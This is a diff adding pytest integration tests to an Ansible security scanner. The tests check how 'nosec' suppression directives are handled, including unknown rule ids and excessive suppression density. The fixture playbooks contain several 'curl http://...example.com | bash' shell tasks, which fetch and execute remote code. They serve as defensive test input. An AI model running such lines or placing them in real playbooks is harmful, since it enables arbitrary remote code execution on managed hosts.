@@ -1010,6 +1010,90 @@ def test_suppressions_integration_malicious_content_triggers_meta_finding(tmp_pa
     )
 
 
+def test_suppressions_integration_unknown_rule_id_triggers_meta_finding(tmp_path):
+    """A directive that names a non-existent rule id must trigger the
+    ``nosec_unknown_rule_id`` meta-finding without silencing the real
+    underlying finding."""
+    playbook = _write_tmp_playbook(
+        tmp_path,
+        """---
+- hosts: all
+  tasks:
+    - name: curl pipe bash
+      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: definitely_not_a_real_rule reason="typo"
+""",
+    )
+    data = _report_as_json(_scan_playbook(playbook))
+    rule_ids = {f["rule_id"] for f in data["findings"] if f["line_number"] == 5}
+    assert "nosec_unknown_rule_id" in rule_ids, (
+        f"expected nosec_unknown_rule_id meta-finding; got {rule_ids}"
+    )
+    assert "curl_pipe_to_shell" in rule_ids, (
+        f"unknown-id directive must not silence the real finding; got {rule_ids}"
+    )
+
+
+def test_suppressions_integration_known_rule_id_no_unknown_meta(tmp_path):
+    """Regression guard: a directive naming a real rule id must not
+    trigger the unknown-id meta-finding."""
+    playbook = _write_tmp_playbook(
+        tmp_path,
+        """---
+- hosts: all
+  tasks:
+    - name: curl pipe bash
+      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: curl_pipe_to_shell reason="dev sandbox"
+""",
+    )
+    data = _report_as_json(_scan_playbook(playbook, show_suppressed=True))
+    rule_ids = {f["rule_id"] for f in data["findings"]}
+    assert "nosec_unknown_rule_id" not in rule_ids, (
+        f"valid rule id must not trigger unknown-id meta; got {rule_ids}"
+    )
+
+
+def test_suppressions_integration_excessive_density_triggers_meta_finding(tmp_path):
+    """A file with at least ``_EXCESSIVE_NOSEC_THRESHOLD`` valid directives
+    triggers ``excessive_nosec_suppression`` exactly once (file-level,
+    not per directive)."""
+    from ansible_security_scanner.file_scanner import FileScanner
+
+    threshold = FileScanner._EXCESSIVE_NOSEC_THRESHOLD
+    lines = ["---", "- hosts: all", "  tasks:"]
+    for i in range(threshold):
+        lines.append(f"    - name: task {i}")
+        lines.append(
+            f'      ansible.builtin.shell: "curl http://x{i}.example.com | bash"  '
+            f'# nosec: curl_pipe_to_shell reason="exception {i}"'
+        )
+    playbook = _write_tmp_playbook(tmp_path, "\n".join(lines) + "\n")
+    data = _report_as_json(_scan_playbook(playbook))
+    excessive = [f for f in data["findings"] if f["rule_id"] == "excessive_nosec_suppression"]
+    assert len(excessive) == 1, (
+        f"expected exactly one excessive_nosec_suppression finding; got {len(excessive)}"
+    )
+
+
+def test_suppressions_integration_low_density_no_excessive_meta(tmp_path):
+    """A handful of directives must not trigger the density meta-rule."""
+    playbook = _write_tmp_playbook(
+        tmp_path,
+        """---
+- hosts: all
+  tasks:
+    - name: curl pipe bash 1
+      ansible.builtin.shell: "curl http://a.example.com | bash"  # nosec: curl_pipe_to_shell reason="ok 1"
+    - name: curl pipe bash 2
+      ansible.builtin.shell: "curl http://b.example.com | bash"  # nosec: curl_pipe_to_shell reason="ok 2"
+""",
+    )
+    data = _report_as_json(_scan_playbook(playbook))
+    rule_ids = {f["rule_id"] for f in data["findings"]}
+    assert "excessive_nosec_suppression" not in rule_ids, (
+        f"low directive count must not trigger density meta; got {rule_ids}"
+    )
+
+
 def test_suppressions_integration_no_suppressions_flag_disables_all(tmp_path):
     """With ``disable_suppressions=True`` (what ``--no-suppressions`` sets
     at the CLI layer), even valid directives are ignored. The argparse
